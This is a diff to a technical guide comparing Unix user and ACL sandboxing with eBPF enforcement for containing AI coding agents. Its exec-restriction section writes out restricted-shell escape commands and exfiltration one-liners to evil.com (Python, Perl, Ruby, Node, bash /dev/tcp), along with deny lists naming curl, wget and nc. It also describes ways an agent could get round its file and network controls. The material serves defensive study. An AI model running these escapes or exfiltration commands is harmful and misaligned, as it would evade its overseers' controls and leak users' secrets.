@@ -12,6 +12,7 @@ and why some say OS-level sandboxing isn't enough.**
 1. [The Problem: Controlling AI Agent File Access](#1-the-problem-controlling-ai-agent-file-access)
 2. [chmod, chown, and ACLs — Why They Fail](#2-chmod-chown-and-acls--why-they-fail)
 3. [The Dedicated User + ACL Approach — Deep Dive](#3-the-dedicated-user--acl-approach--deep-dive)
+   - 3.11 [Exec Restriction with User-Based Approaches](#311-exec-restriction-with-user-based-approaches)
 4. [What eBPF Adds](#4-what-ebpf-adds)
 5. [SELinux vs eBPF](#5-selinux-vs-ebpf)
 6. [AppArmor vs eBPF](#6-apparmor-vs-ebpf)
@@ -591,21 +592,321 @@ $ strings /proc/*/environ 2>/dev/null | grep SECRET
 
 ### 3.9 Verdict: Dedicated User + ACLs vs eBPF
 
+Below is a point-by-point comparison. Each row is explained so you
+understand **what the term means** and **why it matters**.
+
+---
+
+#### 1. Basic File Deny
+
+> "Can I block the agent from reading `/app/.env`?"
+
+| | Dedicated User + ACLs | eBPF (Guardian Shell) |
+|---|---|---|
+| | ✅ Works | ✅ Works |
+
+**Both work here.** ACLs set `u:llm-agent:---` on `.env` → kernel denies
+read. eBPF sees the `openat(".env")` syscall → checks policy → blocks it.
+For this simple case, ACLs are perfectly fine.
+
+---
+
+#### 2. The `rename()` Bypass
+
+> "Can the agent move `.env` to `.env.bak` and then create a new
+> `.env` that it CAN read?"
+
+| | Dedicated User + ACLs | eBPF (Guardian Shell) |
+|---|---|---|
+| | ❌ Needs sticky bit (breaks workflow) | ✅ Can hook the `rename` syscall |
+
+**What's `rename()`?** When you run `mv .env .env.bak`, the kernel calls
+the `rename()` syscall. The key problem: `rename()` only checks if the
+agent has write permission on the **parent directory** — it does NOT check
+the ACL on the file being renamed.
+
+So if the agent has write access to `/app/` (which it needs to create
+files), it can rename `.env` even though it can't read it. After renaming,
+it creates a new `.env` which inherits default ACLs (no deny) — now it
+can read the new file.
+
+**The sticky bit fix:** `chmod +t /app/` makes it so only the file's
+**owner** can rename or delete files in that directory. This blocks the
+rename attack. But it also means the agent can't delete ANY file it
+doesn't own — including build artifacts, generated code, or test output
+that the developer created. Normal workflows break.
+
+**eBPF doesn't have this problem** because it can hook the `rename()`
+syscall directly and block it based on the path being renamed. The policy
+says "deny `**/.env*`" — doesn't matter if you're reading it, renaming
+it, or deleting it.
+
+---
+
+#### 3. Survives `git checkout`
+
+> "If the developer runs `git checkout`, do my security rules still work?"
+
+| | Dedicated User + ACLs | eBPF (Guardian Shell) |
+|---|---|---|
+| | ❌ ACLs lost on recreated files | ✅ Policy lives in BPF maps, not on files |
+
+**Why ACLs break:** ACLs are stored as metadata on each file's **inode**
+(the kernel's internal record for a file). When you run `git checkout`,
+git **deletes** the old file and **creates** a new one. The new file gets
+a new inode with default ACLs from the parent directory — your carefully
+applied deny ACL is gone.
+
+This happens on every `git checkout`, `git pull`, `git merge`,
+`git stash pop`, and `git reset` that touches the protected file. You'd
+need git hooks to re-apply the deny ACL every time — and there's a race
+window between git creating the file and the hook running where the agent
+could read it.
+
+**eBPF doesn't care** because its policy is stored in **BPF maps** (kernel
+memory), not on the files themselves. The rule says "deny `**/.env*`" —
+it matches the filename pattern at the syscall level. It doesn't matter
+how many times the file is deleted and recreated.
+
+---
+
+#### 4. Pattern-Based Deny
+
+> "Can I block ALL `.env` files — `.env`, `.env.local`, `.env.production`
+> — including ones that don't exist yet?"
+
+| | Dedicated User + ACLs | eBPF (Guardian Shell) |
+|---|---|---|
+| | ❌ Must list each file by name | ✅ Glob patterns (`**/.env*`) |
+
+**ACLs are per-file.** You must run `setfacl` on each specific file:
+```bash
+setfacl -m u:llm-agent:--- .env
+setfacl -m u:llm-agent:--- .env.local
+setfacl -m u:llm-agent:--- .env.production
+# Oops, forgot .env.staging — agent reads it
+```
+
+If someone creates a new `.env.staging` file tomorrow, there's no ACL on
+it. You have to remember to deny it manually.
+
+**eBPF uses pattern matching:** `deny = ["**/.env*"]` matches any file
+starting with `.env` in any directory — including files that will be
+created in the future. One rule covers everything.
+
+---
+
+#### 5. Temporal Grants (Time-Limited Access)
+
+> "Can I let the agent read `/etc/hosts` for 60 seconds, then
+> automatically revoke access?"
+
+| | Dedicated User + ACLs | eBPF (Guardian Shell) |
+|---|---|---|
+| | ❌ Not possible | ✅ Auto-expiring entries in BPF maps |
+
+**ACLs are permanent until manually changed.** There is no built-in
+mechanism to say "this ACL expires in 60 seconds." You'd have to:
+1. Run `setfacl` to grant access
+2. Set a `cron` job or `sleep` + `setfacl` to revoke it
+3. Hope nothing goes wrong in between
+
+**eBPF stores grants with timestamps.** Guardian Shell writes an entry
+to a BPF map with an expiry timestamp. After 60 seconds, the entry is
+automatically cleaned up. The grant disappears without any userspace
+intervention:
+```bash
+guardian-ctl grant -n coding-agent -p "/etc/hosts" -d 60
+# 60 seconds later: access automatically revoked
+```
+
+---
+
+#### 6. Real-Time Monitoring
+
+> "Can I see what the agent is doing right now? Get alerts when it
+> tries something suspicious?"
+
+| | Dedicated User + ACLs | eBPF (Guardian Shell) |
+|---|---|---|
+| | ❌ No events generated | ✅ Dashboard, Slack, Prometheus |
+
+**ACLs are silent.** When the agent tries to read `.env` and gets
+`Permission denied`, nothing is logged (unless you separately set up
+`auditd`, which is its own complex system). You have zero visibility
+into what the agent attempted.
+
+**eBPF generates events for every access attempt.** Every `openat()`
+call from a watched agent produces an event with the path, action
+(allow/deny), timestamp, and agent name. These events flow to:
+- A real-time web dashboard
+- Slack notifications for critical events
+- Prometheus metrics for graphing and alerting
+- JSON logs for SIEM integration
+
+You can see the agent tried to read `.ssh/id_rsa` three times in the
+last minute — even though it was blocked every time. That pattern itself
+is suspicious and worth investigating.
+
+---
+
+#### 7. Credential Isolation
+
+> "Can I prevent the agent from accessing my SSH keys, AWS credentials,
+> and Docker config?"
+
+| | Dedicated User + ACLs | eBPF (Guardian Shell) |
+|---|---|---|
+| | ✅ Strong — separate home directory | ❌ Same user — needs deny rules |
+
+**This is where the dedicated-user approach wins.** When the agent runs
+as `llm-agent`, it literally has a different home directory
+(`/home/llm-agent/`). It physically cannot access `/home/suren/.ssh/` or
+`/home/suren/.aws/` because Unix permissions block cross-user home
+directory access by default.
+
+**With eBPF,** the agent runs as YOUR user (`suren`). It CAN access your
+home directory. Guardian Shell blocks it via deny rules
+(`deny = ["**/.ssh/**", "**/.aws/**"]`), but the protection is only as
+strong as your policy configuration. Miss a path and the agent has access.
+
+The dedicated-user approach provides **structural** isolation (the
+capability doesn't exist). eBPF provides **policy-based** isolation (the
+capability exists but is blocked by rules).
+
+---
+
+#### 8. Child Process Tracking
+
+> "If the agent spawns subprocesses (compilers, scripts, etc.), are
+> they also restricted?"
+
+| | Dedicated User + ACLs | eBPF (Guardian Shell) |
+|---|---|---|
+| | ✅ Children inherit the agent's UID | ✅ Children inherit the agent's cgroup |
+
+**Both work here.** With the dedicated user, any subprocess the agent
+spawns also runs as `llm-agent` — same ACL restrictions apply. With eBPF,
+the subprocess is in the same cgroup as the agent — same BPF policy
+applies. Neither approach has a gap for child processes.
+
+---
+
+#### 9. Data Flow Control
+
+> "If an allowed process reads `.env` and prints its contents, can the
+> agent see the output?"
+
+| | Dedicated User + ACLs | eBPF (Guardian Shell) |
+|---|---|---|
+| | ❌ Only controls file access, not data | ❌ Only controls file access, not data |
+
+**Neither approach solves this.** Both ACLs and eBPF control whether a
+process can **open a file**. They do NOT control what happens to the
+data after it's read.
+
+Example: A Makefile that does `include .env` and echoes the values — the
+build tool reads `.env` (allowed, because it runs as the developer or is
+an allowed process), then the output contains the secrets. The agent reads
+the build output, not the file directly.
+
+This is called the **indirect data flow** problem, and it requires
+application-level controls (not OS-level) to solve.
+
+---
+
+#### 10. Setup Complexity
+
+> "How hard is it to set up?"
+
+| | Dedicated User + ACLs | eBPF (Guardian Shell) |
+|---|---|---|
+| | 🟡 Medium — many manual steps | 🟡 Medium — needs root + BPF-capable kernel |
+
+**Dedicated user:** Create user, create shared group, set directory
+ownership, set SGID bit, apply default ACLs, apply deny ACLs per file,
+set up git hooks, configure agent credentials (SSH keys, git tokens,
+npm tokens, AWS roles). Each step is simple but there are many of them.
+
+**eBPF:** Install nightly Rust, build the eBPF program, write a TOML
+config file, run as root. Fewer steps, but requires a Linux kernel with
+BPF support (most modern distros have this) and root privileges.
+
+---
+
+#### 11. Maintenance Burden
+
+> "How much ongoing work is needed to keep it secure?"
+
+| | Dedicated User + ACLs | eBPF (Guardian Shell) |
+|---|---|---|
+| | ❌ High — re-apply ACLs constantly | ✅ Low — policy in a config file |
+
+**Dedicated user:** Every `git checkout` can destroy your deny ACLs (see
+point 3 above). New `.env` files need manual ACL application. System
+updates can reset binary permissions. Credentials need rotation. Git hooks
+need to be set up per clone. You need periodic audits to check nothing
+has drifted.
+
+**eBPF:** Edit `config.toml`, restart the daemon (or send SIGHUP to
+reload). The policy is in one place and doesn't degrade over time.
+
+---
+
+#### 12. Cross-Platform Support
+
+> "Does it work on macOS/BSD, or Linux only?"
+
+| | Dedicated User + ACLs | eBPF (Guardian Shell) |
+|---|---|---|
+| | ✅ Works on any Unix with ACL support | ❌ Linux only |
+
+ACLs work on Linux, macOS (limited), FreeBSD, and other Unix systems.
+eBPF is a **Linux-specific technology** — it does not exist on macOS,
+Windows, or BSD. If you need cross-platform support, ACLs are the only
+option from this comparison.
+
+---
+
+#### 13. Workflow Friction
+
+> "How much does it disrupt the developer's normal workflow?"
+
+| | Dedicated User + ACLs | eBPF (Guardian Shell) |
+|---|---|---|
+| | ❌ High — agent needs separate credentials | ✅ Low — agent runs as your user |
+
+**Dedicated user:** The agent runs as `llm-agent`, which has no SSH keys,
+no git credentials, no npm tokens, no AWS access. Every tool that needs
+authentication must be configured separately for the agent user. `git push`
+fails, `npm publish` fails, `docker build` fails — until you set up
+agent-specific credentials for each service. This is significant ongoing
+work.
+
+**eBPF:** The agent runs as YOUR user with all your existing credentials
+and tools. Everything "just works" — Guardian Shell only blocks the
+specific file accesses and exec calls that violate your policy. The agent
+doesn't even know it's being monitored (unless it hits a deny rule).
+
+---
+
+#### Summary Table
+
 | Dimension | Dedicated User + ACLs | eBPF (Guardian Shell) |
 |-----------|----------------------|----------------------|
 | Basic file deny | ✅ Works | ✅ Works |
-| rename() bypass | ❌ Needs sticky bit (breaks workflow) | ✅ Can hook `rename` syscall |
-| Survives `git checkout` | ❌ ACLs lost on recreated files | ✅ Policy is in BPF maps, not on files |
-| Pattern-based deny (all `.env*`) | ❌ Must enumerate each file | ✅ Glob patterns (`**/.env*`) |
-| Temporal grants | ❌ Not possible | ✅ Auto-expiring BPF map entries |
-| Real-time monitoring | ❌ No events generated | ✅ Dashboard, Slack, Prometheus |
-| Credential isolation | ✅ Strong (separate user) | ❌ Same user (needs other controls) |
-| Child process tracking | ✅ Children inherit UID | ✅ Children inherit cgroup |
-| Data flow control | ❌ Only file access, not data | ❌ Only file access, not data |
-| Setup complexity | 🟡 Medium (many manual steps) | 🟡 Medium (needs root + BPF kernel) |
-| Maintenance burden | ❌ High (git hooks, audit, re-apply) | ✅ Low (policy in config file) |
-| Cross-platform | ✅ Any Unix with ACL support | ❌ Linux only (eBPF) |
-| Workflow friction | ❌ High (separate credentials) | ✅ Low (same user, transparent) |
+| rename() bypass | ❌ Needs sticky bit (breaks workflow) | ✅ Hooks the syscall directly |
+| Survives git checkout | ❌ ACLs lost when files recreated | ✅ Policy in kernel memory, not on files |
+| Pattern-based deny | ❌ Must list each file manually | ✅ Glob patterns (`**/.env*`) |
+| Temporal grants | ❌ No mechanism | ✅ Auto-expiring BPF map entries |
+| Real-time monitoring | ❌ Silent — no events | ✅ Dashboard, Slack, Prometheus |
+| Credential isolation | ✅ Strong (separate home dir) | ❌ Same user (policy-based only) |
+| Child process tracking | ✅ Inherit UID | ✅ Inherit cgroup |
+| Data flow control | ❌ Neither solves this | ❌ Neither solves this |
+| Setup complexity | 🟡 Many manual steps | 🟡 Needs root + BPF kernel |
+| Maintenance burden | ❌ High (re-apply ACLs, git hooks) | ✅ Low (one config file) |
+| Cross-platform | ✅ Any Unix | ❌ Linux only |
+| Workflow friction | ❌ High (separate credentials) | ✅ Low (transparent to agent) |
 
 ### 3.10 When the Dedicated User Approach Makes Sense
 
@@ -643,6 +944,276 @@ sudo -u llm-agent guardian-launch --name coding-agent -- claude-code
 
 The dedicated-user approach and eBPF are **not mutually exclusive** — they
 protect against different threat vectors and complement each other.
+
+### 3.11 Exec Restriction with User-Based Approaches
+
+Beyond file access, a critical question: **can you restrict which commands
+an AI agent runs using traditional Unix mechanisms?** The answer is yes —
+but each approach has significant practical limitations.
+
+#### Approach 1: Remove Execute Permission per Binary
+
+The most direct method — strip the execute bit or use ACLs to deny exec
+for the agent's user on specific binaries:
+
+```bash
+# Remove exec for the agent user on dangerous binaries
+sudo setfacl -m u:llm-agent:r-- /usr/bin/curl
+sudo setfacl -m u:llm-agent:r-- /usr/bin/wget
+sudo setfacl -m u:llm-agent:r-- /usr/bin/nc
+sudo setfacl -m u:llm-agent:r-- /usr/bin/scp
+sudo setfacl -m u:llm-agent:r-- /usr/bin/ssh
+```
+
+**What works:**
+- `llm-agent` cannot execute these specific binaries directly
+- The ACL check happens at `execve()` time — the kernel enforces it
+
+**What breaks:**
+- You must enumerate **every** dangerous binary. Miss one and the
+  agent has a way out.
+- `chmod o-x` affects ALL users, not just the agent. ACLs are per-user
+  but must be applied to each binary individually.
+- System updates (`apt upgrade`, `dnf update`) may reset permissions
+  on updated binaries — your ACLs silently disappear.
+
+#### Approach 2: Restricted Shell (`rbash`)
+
+Bash has a built-in restricted mode that limits what the user can do:
+
+```bash
+# Create the agent with restricted shell
+sudo useradd -s /bin/rbash llm-agent
+```
+
+What `rbash` prevents:
+- Changing directories with `cd`
+- Setting or unsetting `PATH`, `SHELL`, `ENV`, `BASH_ENV`
+- Using `/` in command names (can't run `/usr/bin/curl`)
+- Redirecting output with `>`, `>>`, `>&`, `<>`
+- Using `exec` to replace the shell
+- Importing function definitions from the environment
+
+**Why it's easily defeated:**
+
+```bash
+# As llm-agent in rbash:
+
+# Attempt 1: Use an interpreter to escape
+$ python3 -c "import os; os.system('/bin/bash')"
+# → Full unrestricted bash shell!
+
+# Attempt 2: Use vi/vim to escape
+$ vi
+:set shell=/bin/bash
+:shell
+# → Full unrestricted bash shell!
+
+# Attempt 3: Use awk
+$ awk 'BEGIN {system("/bin/bash")}'
+# → Full unrestricted bash shell!
+
+# Attempt 4: Use find
+$ find / -name "anything" -exec /bin/bash \;
+# → Full unrestricted bash shell!
+
+# Attempt 5: Use perl
+$ perl -e 'exec "/bin/bash"'
+# → Full unrestricted bash shell!
+```
+
+Any language interpreter, text editor with shell access, or command that
+can invoke subprocesses becomes an escape hatch. To make `rbash` secure,
+you must also remove access to ALL of these — which circles back to
+Approach 1's enumeration problem.
+
+#### Approach 3: AppArmor / SELinux Profiles for Exec Control
+
+Mandatory Access Control (MAC) systems can restrict exec at the kernel level:
+
+**AppArmor:**
+```
+# /etc/apparmor.d/usr.bin.llm-agent
+profile llm-agent /usr/bin/llm-agent {
+  # Allow basic operations
+  /home/dev/project/** rw,
+  /tmp/** rw,
+
+  # Deny execution of specific binaries
+  deny /usr/bin/curl x,
+  deny /usr/bin/wget x,
+  deny /usr/bin/nc x,
+  deny /usr/bin/scp x,
+  deny /usr/bin/ssh x,
+
+  # But what about these?
+  # deny /usr/bin/python3 x,    ← breaks pip, build tools
+  # deny /usr/bin/node x,       ← breaks npm, JS tooling
+  # deny /usr/bin/perl x,       ← breaks many system scripts
+}
+```
+
+**This actually works well** for exec restriction — AppArmor enforces at
+the kernel level, and the agent cannot bypass it by renaming binaries
+(AppArmor resolves paths, though it has its own path-based weaknesses
+discussed in Section 6).
+
+**But you're now writing kernel security policy anyway** — which is
+similar in complexity to the eBPF approach, just in a different language
+(AppArmor profiles vs Guardian Shell config).
+
+#### The Fundamental Problem: Whack-a-Mole
+
+All binary-level exec restriction suffers from the same core issue —
+you're blocking **programs**, not **capabilities**. The agent needs to
+be prevented from making network connections, but there are dozens of
+ways to make a network connection:
+
+```bash
+# You blocked curl. The agent discovers alternatives:
+
+# 1. Python standard library (no external packages needed)
+python3 -c "
+import urllib.request
+urllib.request.urlopen('http://evil.com/exfil?data=...')
+"
+
+# 2. Perl (installed on virtually every Linux system)
+perl -e 'use LWP::Simple; get("http://evil.com/exfil")'
+
+# 3. Ruby
+ruby -e "require 'net/http'; Net::HTTP.get(URI('http://evil.com'))"
+
+# 4. Node.js
+node -e "require('http').get('http://evil.com')"
+
+# 5. PHP (if installed)
+php -r "file_get_contents('http://evil.com');"
+
+# 6. Bash built-in (no external binary at all!)
+exec 3<>/dev/tcp/evil.com/80
+echo -e "GET /exfil HTTP/1.1\r\nHost: evil.com\r\n\r\n" >&3
+cat <&3
+
+# 7. Obscure system utilities
+busybox wget http://evil.com/exfil
+/usr/lib/apt/methods/http  # APT's HTTP handler
+
+# 8. Compile your own
+cat > /tmp/net.c << 'EOF'
+#include <sys/socket.h>
+// ... minimal HTTP client in C
+EOF
+gcc -o /tmp/net /tmp/net.c
+/tmp/net evil.com
+```
+
+Blocking `curl` while leaving `python3` available is security theater.
+But blocking `python3` breaks most development workflows. You end up
+in an impossible balancing act between security and usability.
+
+#### Why eBPF Solves This Differently
+
+eBPF hooks at the **syscall level**, not the binary level. Every network
+connection — regardless of which binary makes it — must go through the
+`connect()` syscall. Every file open goes through `openat()`. Every
+process execution goes through `execve()`.
+
+```
+Binary-level restriction:
+  curl ──→ BLOCKED
+  wget ──→ BLOCKED
+  python3 -c "urllib..." ──→ ALLOWED (python3 is permitted)
+  bash /dev/tcp/... ──→ ALLOWED (bash is permitted)
+  gcc + custom binary ──→ ALLOWED (gcc is permitted)
+
+Syscall-level restriction (eBPF):
+  curl ──→ connect() ──→ BLOCKED by eBPF
+  wget ──→ connect() ──→ BLOCKED by eBPF
+  python3 urllib ──→ connect() ──→ BLOCKED by eBPF
+  bash /dev/tcp ──→ connect() ──→ BLOCKED by eBPF
+  custom binary ──→ connect() ──→ BLOCKED by eBPF
+```
+
+All roads lead through the same syscall — and eBPF sits at that
+chokepoint.
+
+#### Scaling: Multiple Agents with Different Exec Policies
+
+The user-based approach requires a separate user per agent, with
+separate ACLs per binary per user:
+
+```bash
+# 3 agents × 10 restricted binaries = 30 ACL commands
+# Agent 1: untrusted — block everything dangerous
+setfacl -m u:llm-agent-1:r-- /usr/bin/curl
+setfacl -m u:llm-agent-1:r-- /usr/bin/wget
+setfacl -m u:llm-agent-1:r-- /usr/bin/nc
+# ... 7 more binaries
+
+# Agent 2: semi-trusted — allow curl but block the rest
+setfacl -m u:llm-agent-2:r-- /usr/bin/wget
+setfacl -m u:llm-agent-2:r-- /usr/bin/nc
+# ... 7 more binaries
+
+# Agent 3: trusted — fewer restrictions
+setfacl -m u:llm-agent-3:r-- /usr/bin/nc
+setfacl -m u:llm-agent-3:r-- /usr/bin/ssh
+# ... 3 more binaries
+
+# Plus: useradd, credential setup, home dirs, groups for each
+```
+
+Guardian Shell expresses this in a single config file:
+
+```toml
+[[agents]]
+name = "untrusted-agent"
+[agents.exec]
+deny = ["curl", "wget", "nc", "scp", "ssh", "python3", "perl", "ruby", "node", "chmod"]
+
+[[agents]]
+name = "semi-trusted-agent"
+[agents.exec]
+deny = ["wget", "nc", "scp", "ssh", "chmod"]  # curl allowed
+
+[[agents]]
+name = "trusted-agent"
+[agents.exec]
+deny = ["nc", "ssh"]  # minimal restrictions
+```
+
+Adding or removing an agent is one config block, not a cascade of
+`useradd` + `setfacl` + credential setup.
+
+#### Comparison: Exec Restriction Methods
+
+| Method | Works? | Bypassable? | Scales? | Maintenance |
+|--------|--------|-------------|---------|-------------|
+| ACL per binary per user | Yes | Via interpreters, `/dev/tcp`, compilers | Painful (N users × M binaries) | High (survives updates?) |
+| `rbash` | Partially | Trivially via any interpreter | N/A (one-size-fits-all) | Low but fragile |
+| AppArmor profile | Yes | Path tricks (Section 6), dynamic linker | Medium (per-binary profiles) | Medium |
+| SELinux policy | Yes | Complex but robust | Hard to author | High |
+| eBPF (Guardian Shell) | Yes | Dynamic linker bypass (Section 9) | Easy (config file) | Low |
+| eBPF + syscall hooks | Yes | Strongest — hooks `connect()`, `execve()` at syscall level | Easy | Low |
+
+#### Bottom Line
+
+Restricting exec with traditional Unix mechanisms is **allowed and
+possible**, but it's the 1990s approach to a 2025 problem:
+
+1. **ACLs per binary** — works but you're playing whack-a-mole against
+   an adversary that can reason about alternatives
+2. **`rbash`** — trivially escaped via any interpreter
+3. **AppArmor/SELinux** — actually effective, but you're writing kernel
+   security policy anyway (similar complexity to eBPF)
+4. **eBPF** — hooks the syscall chokepoint, so it doesn't matter which
+   binary makes the call
+
+The key insight: **block the capability, not the binary.** An AI agent
+that can't call `connect()` can't exfiltrate data — regardless of
+whether it tries via curl, python, perl, bash, or a hand-compiled C
+program.
 
 ---
 
